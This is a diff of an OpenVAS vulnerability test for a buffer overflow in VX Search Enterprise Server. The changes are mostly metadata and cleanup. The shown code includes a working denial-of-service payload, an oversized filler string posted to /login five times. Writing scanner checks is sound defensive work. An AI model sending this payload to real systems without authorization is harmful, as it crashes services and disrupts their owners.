@@ -1,6 +1,6 @@
 ##############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_vx_search_enterprise_server_bof_vuln.nasl 11026 2018-08-17 08:52:26Z cfischer $
+# $Id: gb_vx_search_enterprise_server_bof_vuln.nasl 11506 2018-09-20 13:32:45Z cfischer $
 #
 # VX Search Enterprise Server Buffer Overflow Vulnerability
 #
@@ -29,10 +29,10 @@ CPE = "cpe:/a:vx:search_enterprise";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.809061");
-  script_version("$Revision: 11026 $");
+  script_version("$Revision: 11506 $");
   script_tag(name:"cvss_base", value:"5.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2018-08-17 10:52:26 +0200 (Fri, 17 Aug 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-20 15:32:45 +0200 (Thu, 20 Sep 2018) $");
   script_tag(name:"creation_date", value:"2016-10-10 10:19:35 +0530 (Mon, 10 Oct 2016)");
   script_tag(name:"qod_type", value:"remote_vul");
   script_name("VX Search Enterprise Server Buffer Overflow Vulnerability");
@@ -49,9 +49,7 @@ if(description)
 
   script_tag(name:"impact", value:"Successful exploitation may allow remote
   attackers to cause the application to crash, creating a denial-of-service
-  condition.
-
-  Impact Level: Application");
+  condition.");
 
   script_tag(name:"affected", value:"VX Search Enterprise version 9.0.26");
 
@@ -85,25 +83,19 @@ if(!http_port = get_app_port(cpe:CPE)){
   exit(0);
 }
 
-## Cross Confirm to avoid FP
 if(http_is_dead(port:http_port)){
   exit(0);
 }
 
 host = http_host_name(port:http_port);
-if(!host){
-  exit(0);
-}
 
 exploit = crap(data: "0x41", length:12292);
 PAYLOAD = "username=test" + "&password=test" + "\r\n" + exploit;
 
-## Sending crafted data
 sndReq = http_post_req(port:http_port, url:"/login", data:PAYLOAD,
          add_headers: make_array("Content-Type",
          "application/x-www-form-urlencoded","Origin",
          "http://" + host,"Content-Length", strlen(PAYLOAD)));
-
 
 ##Send Multiple Times , Inconsistency Issue
 for (j=0;j<5;j++)
@@ -116,3 +108,5 @@ for (j=0;j<5;j++)
     exit(0);
   }
 }
+
+exit(99);
